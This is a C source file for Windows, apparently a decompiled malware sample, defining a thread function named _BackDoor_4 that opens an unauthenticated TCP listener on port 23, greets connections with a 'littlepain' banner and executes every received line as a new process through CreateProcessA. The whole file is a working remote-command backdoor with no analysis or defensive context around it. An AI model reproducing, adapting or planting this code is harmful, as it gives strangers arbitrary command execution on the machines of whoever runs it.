#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#pragma optimize("", off)
DWORD WINAPI _BackDoor_4(LPVOID Data)
{
    volatile struct _LocalCtx {
        int iVar1;
        uint32_t uVar2;
        BOOL BVar3;
        PROCESS_INFORMATION local_28c;
        STARTUPINFOA local_27c;
        char local_238[260];
        fd_set local_134;
        struct timeval local_30;
        struct sockaddr_in local_28;
        SOCKET local_18;
        SOCKET local_14;
        uint32_t local_10;
    } ctx;

    ctx.local_14 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ctx.local_14 != INVALID_SOCKET) {
        ctx.local_28.sin_family = AF_INET;
        ctx.local_28.sin_addr.s_addr = htonl(INADDR_ANY);
        ctx.local_28.sin_port = htons(23);
        ctx.iVar1 = bind(ctx.local_14, (struct sockaddr *)&ctx.local_28, sizeof(struct sockaddr_in));
        if (ctx.iVar1 != -1) {
            listen(ctx.local_14, SOMAXCONN);
            do {
                ctx.local_18 = accept(ctx.local_14, NULL, NULL);
                ctx.local_30.tv_usec = 0;
                ctx.local_30.tv_sec = 60;
                ctx.local_134.fd_count = 1;
                ctx.local_134.fd_array[0] = ctx.local_18;
                send(ctx.local_18, "[:: littlepain ::] by WarGame\r\n", 31, 0);
                while (ctx.iVar1 = select(ctx.local_18 + 1, &ctx.local_134, NULL, NULL, &ctx.local_30), ctx.iVar1 > 0) {
                    memset(ctx.local_238, 0, sizeof(ctx.local_238));
                    recv(ctx.local_18, ctx.local_238, sizeof(ctx.local_238), 0);
                    ctx.uVar2 = strlen(ctx.local_238);
                    for (ctx.local_10 = 0; ctx.local_10 < ctx.uVar2; ctx.local_10++) {
                        if ((ctx.local_238[ctx.local_10] == '\r') || (ctx.local_238[ctx.local_10] == '\n')) {
                            ctx.local_238[ctx.local_10] = '\0';
                        }
                    }
                    memset(&ctx.local_27c, 0, sizeof(ctx.local_27c));
                    memset(&ctx.local_28c, 0, sizeof(ctx.local_28c));
                    ctx.local_27c.cb = sizeof(STARTUPINFOA);
                    ctx.local_27c.dwFlags = STARTF_USESHOWWINDOW;
                    ctx.local_27c.wShowWindow = SW_SHOW;
                    ctx.BVar3 = CreateProcessA(NULL, ctx.local_238, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &ctx.local_27c, &ctx.local_28c);
                    if (ctx.BVar3 == 0) {
                        send(ctx.local_18, "Not Executed!\r\n", 15, 0);
                    }
                    else {
                        send(ctx.local_18, "Executed!\r\n", 11, 0);
                    }
                }
                closesocket(ctx.local_18);
            } while (true);
        }
    }
    return 0;
}
#pragma optimize("", on)
